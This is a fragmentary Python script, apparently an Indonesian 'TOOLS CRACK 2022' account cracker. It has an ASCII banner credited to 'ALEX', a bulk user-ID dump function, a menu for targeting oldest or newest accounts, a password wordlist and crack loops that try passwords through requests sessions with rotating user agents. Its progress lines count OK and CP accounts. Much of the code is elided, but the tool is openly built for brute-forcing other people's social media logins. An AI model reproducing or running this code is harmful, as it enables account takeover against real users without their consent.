...
def banner():
	clear()
	wel = '# TOOLS CRACK 2022'
	wel2 = mark(wel, style='cyan')
	sol().print(wel2)
	au='░█▀▀▀ ─█▀▀█ ░█▀▀█ ░█▀▀▀ ░█▀▀█ ░█▀▀▀█ ░█▀▀▀█ ░█─▄▀ +> CrakeT ALEX \n░█▀▀▀ ░█▄▄█ ░█─── ░█▀▀▀ ░█▀▀▄ ░█──░█ ░█──░█ ░█▀▄─ +> Suport GW SELALU\n░█─── ░█─░█ ░█▄▄█ ░█▄▄▄ ░█▄▄█ ░█▄▄▄█ ░█▄▄▄█ ░█─░█ +> THANKS EMAK'                                                                                                                                                                   
	pengembang1=nel(au,style="red")
	cetak(nel(pengembang1, title='ALEX'))
...
def dump_massal():
	...
	for userr in uid:
		try:
			...
			sol().print(lo, style='cyan')
			exit()
	tot = '# TOTAL 👉 %s ID, BISMILLAH HOKI'%(len(id))
	if len(id)==0:
...
def setting():
	...
	teks = '\33[37;1m[01] Crack Dari Akun Tertua (hasil lama)\n\33[37;1m[02] Crack Dari Akun Termuda (hasil cpt)\n\33[37;1m[03] Acak Urutan ID'
...
# WORDLIST
def passwrd():
	ler = '# PROSES CRAKER BERJALAN, TEKAN CTRL+Z UNTUK BERHENTI'
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s+> [ Prosesing ] %s/%s <<>> OK:%s <<>> CP:%s <<>> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def crack3(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s+> [ Prosesing ]i %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
